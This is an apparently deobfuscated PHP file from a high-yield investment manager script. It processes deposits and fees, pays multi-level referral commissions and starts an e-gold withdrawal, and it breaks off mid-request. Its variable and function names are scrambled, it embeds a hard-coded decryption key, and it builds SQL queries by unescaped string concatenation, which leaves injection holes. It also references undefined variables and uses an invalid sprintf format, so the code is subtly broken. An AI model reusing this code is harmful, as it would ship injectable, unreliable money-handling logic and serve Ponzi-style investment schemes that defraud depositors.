<?
/*****************************************************/
/*                                                    */
/*  Este archivo fue creado por RedControl            */
/*                                                    */
/*                                                    */
/*    Version:      2010                              */
/*    Author:       www.redcontrol.com.ar             */
/*    Release on:   2010.01.18                        */
/*                                                    */
/******************************************************/


  function elnlcenjk ($elnlcvuCiV)
  {
    $elnlcQSee = array ();
    if (preg_match ('/\\[default\\](.*?)\\[\\/default\\]/', $elnlcvuCiV, $elnlcQSee))
    {
      $elnlcvuCiV = $elnlcQSee[1];
    }

    return $elnlcvuCiV;
  }

  function elnlcqomiu ($elnlcvuCiV, $elnlcIUUJq, $d)
  {
    global $elnlcsyENS;
    $elnlcaMIz = ($elnlcvuCiV + 48273) % $elnlcIUUJq;
    $elnlcDmWIw = $elnlcsyENS['elnlcmjUx'];
    $elnlcSRnoH = $elnlcaMIz;
    while ($elnlcDmWIw == 0)
    {
      if ($d[$elnlcaMIz] != -1)
      {
        ++$elnlcaMIz;
        if ($elnlcaMIz == $elnlcIUUJq)
        {
          $elnlcaMIz = $elnlcsyENS['elnlcmjUx'];
          continue;
        }

        continue;
      }

      $elnlcDmWIw = $elnlcsyENS['elnlctNxTK'];
    }

    return $elnlcaMIz;
  }

  function elnlcunsna ($elnlcvuCiV, $elnlcIUUJq, $d)
  {
    global $elnlcsyENS;
    $elnlcaMIz = ($elnlcvuCiV + 48273) % $elnlcIUUJq;
    $elnlcDmWIw = $elnlcsyENS['elnlcmjUx'];
    while (!$elnlcDmWIw)
    {
      if ($d[$elnlcaMIz] == -1)
      {
        ++$elnlcaMIz;
        if ($elnlcaMIz == $elnlcIUUJq)
        {
          $elnlcaMIz = $elnlcsyENS['elnlcmjUx'];
          continue;
        }

        continue;
      }

      $elnlcDmWIw = $elnlcsyENS['elnlctNxTK'];
    }

    return $elnlcaMIz;
  }

  function elnlcqyfdr ()
  {
    global $elnlcsyENS;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlcUAAU;
    global $elnlcSuVc;
    $q = 'select * from hm2_users where id = 1';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    $elnlcpyga = array ();
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcpyga = array ();
      $z = elnlcsajtj ($elnlcCgqPK[$elnlcsyENS['elnlcFNLpS']], '&hd,mnf(fska$d3jlkfsda' . $elnlcSuVc[$elnlcsyENS['elnlcgmuy']]);
      $elnlcpyga = unserialize ($z);
    }

    return $elnlcpyga;
  }

  function elnlcnyfw ()
  {
    global $elnlcsyENS;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlcUAAU;
    global $elnlcuaco;
    global $elnlcSuVc;
    $z = elnlcnczen (elnlcrioy (serialize ($elnlcuaco), '&hd,mnf(fska$d3jlkfsda' . $elnlcSuVc[$elnlcsyENS['elnlcgmuy']]));
    $q = '' . 'update hm2_users set ac = \'' . $z . '\' where id = 1';
    (mysql_query ($q) OR print mysql_error ());
  }

  function elnlcgrvzq ($elnlciSebT, $elnlcOzjJ, $elnlcrUqv, $elnlcVTlA, $elnlcOPfeJ, $elnlcpazb, $elnlcRMwb)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    global $elnlcGPfS;
    $elnlcRMwb = intval ($elnlcRMwb);
    $elnlcpazb = intval ($elnlcpazb);
    $elnlcOzjJ = intval ($elnlcOzjJ);
    $elnlcrUqv = sprintf ('%.02f', $elnlcrUqv);
    $elnlcELjd = elnlcnczen ($elnlcVTlA);
    $elnlcQISB = $elnlcsyENS['elnlcmjUx'];
    $q = '' . 'select count(id) as cnt from hm2_history where ec = ' . $elnlciSebT . ' && type = \'add_funds\' && description like \'%Batch id = ' . $elnlcELjd . '\'';
    $elnlchGkPU = mysql_query ($q);
    $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
    if (0 < $elnlcCgqPK[$elnlcsyENS['elnlchvME']])
    {
      $elnlcQISB = $elnlcsyENS['elnlctNxTK'];
    }

    if ($elnlcQISB == 1)
    {
      return 0;
    }

    $elnlcqCiRr = 'Add funds to account from ' . $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcmjdk']] . ('' . '. Batch id = ' . $elnlcVTlA);
    if (($elnlciSebT == 4 AND $elnlcSuVc[$elnlcsyENS['elnlcmGIAp']] == 1))
    {
      $elnlcqCiRr = 'Add funds to account from ' . $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcmjdk']] . ('' . ' ' . $elnlcrUqv . ' - StormPay Fee. Batch id = ' . $elnlcVTlA);
      $elnlcrUqv = $elnlcrUqv - $elnlcrUqv * 6.90000000000000035527137 / 100 - 0.689999999999999946709295;
    }
    else
    {
      if (($elnlciSebT == 4 AND $elnlcSuVc[$elnlcsyENS['elnlcTnWfH']] == 1))
      {
        $elnlcqCiRr = 'Add funds to account from ' . $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcmjdk']] . ('' . ' ' . $elnlcrUqv . ' - StormPay Fee. Batch id = ' . $elnlcVTlA);
        $elnlcrUqv = $elnlcrUqv - $elnlcrUqv * 2.89999999999999991118216 / 100 - 0.390000000000000013322676;
      }
    }

    if (0 < $elnlcSuVc[$elnlcsyENS['elnlcwoGJs']])
    {
      $elnlcKtjJ = sprintf ('%0.2', $elnlcrUqv * $elnlcSuVc[$elnlcsyENS['elnlcwoGJs']] / 100);
      if ($elnlcKtjJ < $elnlcSuVc[$elnlcsyENS['elnlcldmTL']])
      {
        $elnlcKtjJ = $elnlcSuVc[$elnlcsyENS['elnlcldmTL']];
      }

      $elnlcrUqv = $elnlcrUqv - $elnlcKtjJ;
      $elnlcqCiRr .= '' . '. Deposit fee - ' . $elnlcKtjJ;
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'])
    {
      $elnlciSebT = $elnlcsyENS['elnlcfThgN'];
    }

    $q = '' . 'insert into hm2_history set 
        	user_id = ' . $elnlcOzjJ . ',
        	amount = \'' . $elnlcrUqv . '\',
        	type = \'add_funds\',
        	description = \'' . $elnlcqCiRr . '\',
        	actual_amount = ' . $elnlcrUqv . ',
        	ec = ' . $elnlciSebT . ',
        	date = now()    
        	';
    (mysql_query ($q) OR print mysql_error ());
    $q = '' . 'select * from hm2_types where id = ' . $elnlcpazb;
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    $elnlciAbM = '';
    $elnlcgNwD = mysql_fetch_array ($elnlchGkPU);
    $elnlclfKQI = -1;
    if ($elnlcgNwD)
    {
      $elnlclfKQI += $elnlcCgqPK[$elnlcsyENS['elnlcxfih']];
      $elnlciAbM = elnlcnczen ($elnlcgNwD[$elnlcsyENS['elnlcmjdk']]);
      if ($elnlcgNwD[$elnlcsyENS['elnlcvNkQ']] == 0)
      {
        $elnlcRMwb = $elnlcsyENS['elnlcmjUx'];
      }
      else
      {
        if ($elnlcgNwD[$elnlcsyENS['elnlcdzAd']] == 0)
        {
          $elnlcgNwD[$elnlcsyENS['elnlcdzAd']] = $elnlcrUqv + 1;
        }

        if (($elnlcgNwD[$elnlcsyENS['elnlcqQISr']] <= $elnlcrUqv AND $elnlcrUqv <= $elnlcgNwD[$elnlcsyENS['elnlcdzAd']]))
        {
          if ($elnlcgNwD[$elnlcsyENS['elnlcDxJb']] == 1)
          {
            $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcgNwD[$elnlcsyENS['elnlcDexfh']]);
            if (!in_array ($elnlcRMwb, $elnlcnGUUn))
            {
              $elnlcRMwb = $elnlcnGUUn[0];
            }
          }
          else
          {
            if ($elnlcRMwb < $elnlcgNwD[$elnlcsyENS['elnlcORJuw']])
            {
              $elnlcRMwb = $elnlcgNwD[$elnlcsyENS['elnlcORJuw']];
            }

            if ($elnlcgNwD[$elnlcsyENS['elnlcyDBs']] < $elnlcRMwb)
            {
              $elnlcRMwb = $elnlcgNwD[$elnlcsyENS['elnlcyDBs']];
            }
          }
        }
        else
        {
          $elnlcRMwb = $elnlcsyENS['elnlcmjUx'];
        }
      }
    }

    if ($elnlclfKQI < 0)
    {
      $elnlclfKQI = $elnlcsyENS['elnlcmjUx'];
    }

    $q = '' . 'select min(hm2_plans.min_deposit) as min, max(if(hm2_plans.max_deposit = 0, 999999999999, hm2_plans.max_deposit)) as max from hm2_types left outer join hm2_plans on hm2_types.id = hm2_plans.parent where hm2_types.id = ' . $elnlcpazb;
    $elnlcjSNE = mysql_query ($q);
    $elnlcUpbus = mysql_fetch_array ($elnlcjSNE);
    $elnlcGokT = $elnlcUpbus[$elnlcsyENS['elnlcisNwx']];
    $elnlcxdwm = $elnlcUpbus[$elnlcsyENS['elnlcRfuvo']];
    if (($elnlcGokT <= $elnlcrUqv AND $elnlcrUqv <= $elnlcxdwm))
    {
      $q = '' . 'insert into hm2_deposits set
          	user_id = ' . $elnlcOzjJ . ',
          	type_id = ' . $elnlcpazb . ',
          	deposit_date = now(),
          	last_pay_date = now()+ interval ' . $elnlclfKQI . ' day,
          	status = \'on\',
          	q_pays = 0,
          	amount = \'' . $elnlcrUqv . '\',
          	actual_amount = \'' . $elnlcrUqv . '\',
          	ec = ' . $elnlciSebT . ',
          	compound = ' . $elnlcRMwb . '
          	';
      (mysql_query ($q) OR print mysql_error ());
      $elnlcOMIk = mysql_insert_id ();
      $q = '' . 'insert into hm2_history set 
          	user_id = ' . $elnlcOzjJ . ',
          	amount = \'-' . $elnlcrUqv . '\',
          	type = \'deposit\',
          	description = \'Deposit to ' . elnlcnczen ($elnlciAbM) . ('' . '\',
          	actual_amount = -' . $elnlcrUqv . ',
          	ec = ' . $elnlciSebT . ',
          	date = now(),
                deposit_id = ' . $elnlcOMIk . '
          	');
      (mysql_query ($q) OR print mysql_error ());
      if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcOqItU'])
      {
        $q = '' . 'update hm2_users set reset = 0 where id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
        mysql_query ($q);
      }

      if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcSqlWB'])
      {
        $q = '' . 'select count(id) as col from hm2_deposits where user_id = ' . $elnlcOzjJ;
        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
        $elnlcIRvjo = $elnlcsyENS['elnlcmjUx'];
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcIRvjo = $elnlcCgqPK[$elnlcsyENS['elnlckNCf']];
        }

        $q = 'select count(distinct user_id) as col from hm2_deposits';
        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
        $elnlcRkHn = $elnlcsyENS['elnlcnKDe'];
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcRkHn = $elnlcCgqPK[$elnlcsyENS['elnlckNCf']];
        }

        if (($elnlcIRvjo == 1 AND $elnlcRkHn <= 500))
        {
          $q = '' . 'insert into hm2_history set
  	user_id = ' . $elnlcOzjJ . ',
  	amount = 2,
  	type = \'bonus\',
  	description = \'Bonus\',
  	actual_amount = 2,
  	ec = ' . $elnlciSebT . ',
  	date = now()';
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcSuVc[$elnlcsyENS['elnlcCmNuo']] == 1)
      {
        $elnlcuTTw = $elnlcsyENS['elnlcmjUx'];
        if (0 < $elnlcSuVc[$elnlcsyENS['elnlcBRACo']])
        {
          $elnlcuTTw = $elnlcrUqv * 1000 / $elnlcSuVc[$elnlcsyENS['elnlcBRACo']];
        }

        if (0 < $elnlcuTTw)
        {
          $q = '' . 'update hm2_users set imps = imps + ' . $elnlcuTTw . ' where id = ' . $elnlcOzjJ;
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $elnlcVBEz = elnlcriusr ($elnlcOzjJ, $elnlcrUqv, $elnlciSebT);
    }
    else
    {
      $elnlciAbM = 'Deposit to Account';
    }

    $q = '' . 'select * from hm2_users where id = ' . $elnlcOzjJ;
    $elnlchGkPU = mysql_query ($q);
    $elnlcKCjH = mysql_fetch_array ($elnlchGkPU);
    $elnlcRuFoK = array ($elnlcKCjH);
    $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcKCjH[$elnlcsyENS['elnlczWew']];
    $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcKCjH[$elnlcsyENS['elnlcmjdk']];
    $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = number_format ($elnlcrUqv, 2);
    $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcOPfeJ;
    $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcmjdk']];
    $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
    $elnlcRuFoK[$elnlcsyENS['elnlccdExO']] = $elnlcRMwb;
    $elnlcRuFoK[$elnlcsyENS['elnlcwKttz']] = elnlcenjk ($elnlciAbM);
    $elnlcRuFoK[$elnlcsyENS['elnlcewfHM']] = $elnlcVBEz;
    $elnlcRuFoK[$elnlcsyENS['elnlcdmmm']] = '[no upline]';
    if (0 < $elnlcKCjH[$elnlcsyENS['elnlckGUEd']])
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcKCjH[$elnlcsyENS['elnlckGUEd']];
      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
      {
        $elnlcRuFoK[$elnlcsyENS['elnlcdmmm']] = $elnlcCgqPK[$elnlcsyENS['elnlczWew']];
      }
    }

    $q = 'select email from hm2_users where id = 1';
    $elnlchGkPU = mysql_query ($q);
    $elnlcSWfu = '';
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcSWfu = $elnlcCgqPK[$elnlcsyENS['elnlcdktEr']];
    }

    elnlcsius ('deposit_admin_notification', $elnlcSWfu, $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
    elnlcsius ('deposit_user_notification', $elnlcKCjH[email], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
    return 1;
  }

  function elnlcriusr ($elnlcOzjJ, $elnlcrUqv, $elnlciSebT)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    global $elnlcGPfS;
    $q = '' . 'select * from hm2_users where id = ' . $elnlcOzjJ;
    $elnlcjfjhe = mysql_query ($q);
    $elnlcKyrE = mysql_fetch_array ($elnlcjfjhe);
    if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'])
    {
      $elnlcFjFp = $elnlcORue[$elnlcsyENS['elnlckGUEd']];
      $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcFjFp;
      $elnlchGkPU = mysql_query ($q);
      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
      if ($elnlcCgqPK[$elnlcsyENS['elnlchvME']] <= 0)
      {
        return 0;
      }

      $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits as d, hm2_users as u where d.user_id = u.id and d.status = \'on\' and u.ref = ' . $elnlcFjFp;
      $elnlchGkPU = mysql_query ($q);
      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
      if ($elnlcCgqPK[$elnlcsyENS['elnlcTjxw']] < 3000)
      {
        $elnlcTjnV = $elnlcsyENS['elnlcmjUx'];
        return 0;
      }
      else
      {
        if ($elnlcCgqPK[$elnlcsyENS['elnlcTjxw']] < 6000)
        {
          $elnlcTjnV = 0.0200000000000000004163336;
        }
        else
        {
          if ($elnlcCgqPK[$elnlcsyENS['elnlcTjxw']] < 12000)
          {
            $elnlcTjnV = 0.0500000000000000027755576;
          }
          else
          {
            $elnlcTjnV = 0.100000000000000005551115;
          }
        }
      }

      $elnlcPPMIK = $elnlcrUqv * $elnlcTjnV;
      $q = '' . 'insert into hm2_history set
      	user_id = ' . $elnlcFjFp . ',
      	amount = ' . $elnlcPPMIK . ',
      	actual_amount = ' . $elnlcPPMIK . ',
      	type = \'commissions\',
      	description = \'Referral commission from ' . elnlcnczen ($elnlcKyrE[$elnlcsyENS['elnlczWew']]) . ('' . '\',
      	ec = ' . $elnlciSebT . ',
      	date = now()');
      (mysql_query ($q) OR print mysql_error ());
      $q = '' . 'select * from hm2_users where id = ' . $elnlcFjFp;
      $elnlcjfjhe = mysql_query ($q);
      $elnlcbbeUe = mysql_fetch_array ($elnlcjfjhe);
      $elnlcbbeUe[$elnlcsyENS['elnlcyteO']] = number_format ($elnlcPPMIK, 2);
      $elnlcbbeUe[$elnlcsyENS['elnlcpuuw']] = $elnlcKyrE[$elnlcsyENS['elnlczWew']];
      $elnlcbbeUe[$elnlcsyENS['elnlcfoOq']] = $elnlcKyrE[$elnlcsyENS['elnlcmjdk']];
      $elnlcbbeUe[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcmjdk']];
      elnlcsius ('referral_commision_notification', $elnlcbbeUe[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcbbeUe);
    }

    $elnlcVBEz = $elnlcsyENS['elnlcmjUx'];
    if ($elnlcSuVc[$elnlcsyENS['elnlcLfUAO']] == 1)
    {
      $elnlcFjFp = $elnlcsyENS['elnlcmjUx'];
      if (0 < $elnlcKyrE[$elnlcsyENS['elnlckGUEd']])
      {
        $elnlcFjFp = $elnlcKyrE[$elnlcsyENS['elnlckGUEd']];
      }
      else
      {
        return 0;
      }

      if ($elnlcSuVc[$elnlcsyENS['elnlcSqNhq']])
      {
        $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcFjFp;
        $elnlchGkPU = mysql_query ($q);
        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
        if ($elnlcCgqPK[$elnlcsyENS['elnlchvME']] <= 0)
        {
          return 0;
        }
      }

      if ((0 < $elnlcSuVc[$elnlcsyENS['elnlcTKlQr']] AND $elnlcrUqv < $elnlcSuVc[$elnlcsyENS['elnlcTKlQr']]))
      {
        return 0;
      }

      if ($elnlcSuVc[$elnlcsyENS['elnlcvDITt']] == 1)
      {
        if (0 < $elnlcSuVc[$elnlcsyENS['elnlcJGWIT']])
        {
          $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcOzjJ;
          $elnlchGkPU = mysql_query ($q);
          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
          if ($elnlcCgqPK[$elnlcsyENS['elnlchvME']] == 1)
          {
            $elnlcPPMIK = $elnlcSuVc[$elnlcsyENS['elnlcJGWIT']];
            $elnlcVBEz += $elnlcPPMIK;
            $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcFjFp . ',
    		amount = ' . $elnlcPPMIK . ',
    		actual_amount = ' . $elnlcPPMIK . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcnczen ($elnlcKyrE[$elnlcsyENS['elnlczWew']]) . ('' . '\',
    		ec = ' . $elnlciSebT . ',
    		date = now()');
            (mysql_query ($q) OR print mysql_error ());
            $q = '' . 'select * from hm2_users where id = ' . $elnlcFjFp;
            $elnlcjfjhe = mysql_query ($q);
            $elnlcbbeUe = mysql_fetch_array ($elnlcjfjhe);
            $elnlcbbeUe[$elnlcsyENS['elnlcyteO']] = number_format ($elnlcPPMIK, 2);
            $elnlcbbeUe[$elnlcsyENS['elnlcpuuw']] = $elnlcKyrE[$elnlcsyENS['elnlczWew']];
            $elnlcbbeUe[$elnlcsyENS['elnlcfoOq']] = $elnlcKyrE[$elnlcsyENS['elnlcmjdk']];
            $elnlcbbeUe[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcmjdk']];
            elnlcsius ('referral_commision_notification', $elnlcbbeUe[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcbbeUe);
          }
        }
      }
      else
      {
        if ($elnlcSuVc[$elnlcsyENS['elnlcdlJUJ']] == 1)
        {
          $q = '' . 'select count(distinct user_id) as col from hm2_users, hm2_deposits where ref = ' . $elnlcFjFp . ' and hm2_deposits.user_id = hm2_users.id';
        }
        else
        {
          $q = '' . 'select count(id) as col from hm2_users where ref = ' . $elnlcFjFp;
        }

        $elnlchGkPU = mysql_query ($q);
        if ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcuNJV = $elnlcCgqPK[$elnlcsyENS['elnlckNCf']];
          $q = '' . 'select * from hm2_users where id = ' . $elnlcFjFp;
          $elnlcjfjhe = mysql_query ($q);
          $elnlcbOKUc = mysql_fetch_array ($elnlcjfjhe);
          $elnlcuWsVU = @unserialize ($elnlcbOKUc[$elnlcsyENS['elnlcmIIlU']]);
          if (isset ($elnlcuWsVU[$elnlcsyENS['elnlcmMPnR']]))
          {
            $j = $elnlcsyENS['elnlctNxTK'];
            while (isset ($elnlcuWsVU['ref_percent' . $j]))
            {
              if (($elnlcuWsVU['ref_percent' . $j][0] <= $elnlcuNJV AND $elnlcuNJV <= $elnlcuWsVU['ref_percent' . $j][1]))
              {
                $elnlcPPMIK = $elnlcrUqv * $elnlcuWsVU['ref_percent' . $j][2] / 100;
                $elnlcVBEz += $elnlcPPMIK;
                break;
              }

              ++$j;
            }
          }
          else
          {
            if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDbeKj'])
            {
              $q = '' . 'select sum(amount) as amnt from hm2_deposits where user_id = ' . $elnlcFjFp;
              $elnlchGkPU = mysql_query ($q);
              $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
              $elnlcTjnV = $elnlcsyENS['elnlcmjUx'];
              if (10000 <= $elnlcCgqPK[$elnlcsyENS['elnlcTjxw']])
              {
                $elnlcTjnV = $elnlcsyENS['elnlccIhHr'];
              }
              else
              {
                if (5000 <= $elnlcCgqPK[$elnlcsyENS['elnlcTjxw']])
                {
                  $elnlcTjnV = $elnlcsyENS['elnlcDNqHg'];
                }
                else
                {
                  if (3000 <= $elnlcCgqPK[$elnlcsyENS['elnlcTjxw']])
                  {
                    $elnlcTjnV = $elnlcsyENS['elnlcRneL'];
                  }
                  else
                  {
                    if (1000 <= $elnlcCgqPK[$elnlcsyENS['elnlcTjxw']])
                    {
                      $elnlcTjnV = $elnlcsyENS['elnlcIbwW'];
                    }
                  }
                }
              }

              if (0 < $elnlcTjnV)
              {
                if (4 <= $elnlcuNJV)
                {
                  $elnlcTjnV += 3;
                }

                $elnlcPPMIK = $elnlcrUqv * $elnlcTjnV / 100;
                $elnlcVBEz += $elnlcPPMIK;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcFjFp . ',
    		amount = ' . $elnlcPPMIK . ',
    		actual_amount = ' . $elnlcPPMIK . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcnczen ($elnlcKyrE[$elnlcsyENS['elnlczWew']]) . ('' . '\',
    		ec = ' . $elnlciSebT . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
            else
            {
              $q = '' . 'select percent from hm2_referal where from_value <= ' . $elnlcuNJV . ' and (to_value >= ' . $elnlcuNJV . ' or to_value = 0) order by from_value desc limit 1';
              ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
              if ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
              {
                $elnlcPPMIK = $elnlcrUqv * $elnlcCgqPK[$elnlcsyENS['elnlcOhvjC']] / 100;
                $elnlcVBEz += $elnlcPPMIK;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcFjFp . ',
    		amount = ' . $elnlcPPMIK . ',
    		actual_amount = ' . $elnlcPPMIK . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcnczen ($elnlcKyrE[$elnlcsyENS['elnlczWew']]) . ('' . '\',
    		ec = ' . $elnlciSebT . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcFjFp;
          $elnlcjfjhe = mysql_query ($q);
          $elnlcbbeUe = mysql_fetch_array ($elnlcjfjhe);
          $elnlcbbeUe[$elnlcsyENS['elnlcyteO']] = number_format ($elnlcPPMIK, 2);
          $elnlcbbeUe[$elnlcsyENS['elnlcpuuw']] = $elnlcKyrE[$elnlcsyENS['elnlczWew']];
          $elnlcbbeUe[$elnlcsyENS['elnlcfoOq']] = $elnlcKyrE[$elnlcsyENS['elnlcmjdk']];
          $elnlcbbeUe[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcmjdk']];
          elnlcsius ('referral_commision_notification', $elnlcbbeUe[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcbbeUe);
        }
      }

      if ($elnlcSuVc[$elnlcsyENS['elnlcvDITt']] != 1)
      {
        for ($i = $elnlcsyENS['elnlcbpKgI']; $i < 11; ++$i)
        {
          if (($elnlcFjFp == 0 OR $elnlcSuVc['ref' . $i . '_cms'] == 0))
          {
            break;
          }

          if ((0 < $elnlcSuVc['ref' . $i . '_cms_minamount'] AND $elnlcrUqv < $elnlcSuVc['ref' . $i . '_cms_minamount']))
          {
            continue;
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcFjFp;
          $elnlchGkPU = mysql_query ($q);
          $elnlcFjFp = $elnlcsyENS['elnlcmjUx'];
          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
          {
            $elnlcFjFp = $elnlcCgqPK[$elnlcsyENS['elnlckGUEd']];
            if (0 < $elnlcFjFp)
            {
              $elnlcaKMto = $elnlcsyENS['elnlctNxTK'];
              if ($elnlcSuVc[$elnlcsyENS['elnlcSqNhq']] == 1)
              {
                $elnlcaKMto = $elnlcsyENS['elnlcmjUx'];
                $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcFjFp;
                $elnlcVKWD = mysql_query ($q);
                $elnlcDIUlV = mysql_fetch_array ($elnlcVKWD);
                if (0 < $elnlcDIUlV[$elnlcsyENS['elnlchvME']])
                {
                  $elnlcaKMto = $elnlcsyENS['elnlctNxTK'];
                }
              }

              if ($elnlcaKMto == 1)
              {
                $elnlcPPMIK = $elnlcrUqv * $elnlcSuVc['ref' . $i . '_cms'] / 100;
                $elnlcVBEz += $elnlcPPMIK;
                $q = 'insert into hm2_history set
                  user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlckGUEd']] . ('' . ',
                  amount = ' . $elnlcPPMIK . ',
                  actual_amount = ' . $elnlcPPMIK . ',
                  type = \'commissions\',
                  description = \'Referral commission from ') . elnlcnczen ($elnlcKyrE[$elnlcsyENS['elnlczWew']]) . ('' . ' ' . $i . ' level referral\',
                  ec = ' . $elnlciSebT . ',
                  date = now()');
                (mysql_query ($q) OR print mysql_error ());
                continue;
              }

              continue;
            }
          }
        }
      }
    }

    return $elnlcVBEz;
  }

  function elnlcvkpnr ($elnlcOPfeJ, $elnlciSebT)
  {
    global $elnlcsyENS;
    global $elnlcGPfS;
    $elnlciSebT = intval ($elnlciSebT);
    $elnlcOPfeJ = elnlcnczen ($elnlcOPfeJ);
    $q = '' . 'select count(*) as cnt from hm2_pay_settings where n=\'ext_accounts_blacklist\' and v=\'' . $elnlciSebT . '=' . $elnlcOPfeJ . '\'';
    $elnlchGkPU = mysql_query ($q);
    $elnlcCgqPK = mysql_fetch_assoc ($elnlchGkPU);
    if (0 < $elnlcCgqPK[$elnlcsyENS['elnlchvME']])
    {
      return array (0, 'Blacklisted ' . $elnlcGPfS[$elnlciSebT] . ' account ' . $elnlcOPfeJ);
    }

    return array (1, '');
  }

  function elnlctvanm ($elnlcnOll, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to E-Gold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid E-Gold account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 0);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'egold_account_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcwVkl = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }
      }
      else
      {
        $elnlcwVkl = $elnlcnOll;
      }

      $elnlcEPBUz = curl_init ();
      $elnlcgDnCo = rawurlencode ($elnlcgDnCo);
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'https://www.e-gold.com/acct/confirm.asp');
      curl_setopt ($elnlcEPBUz, CURLOPT_POST, 1);
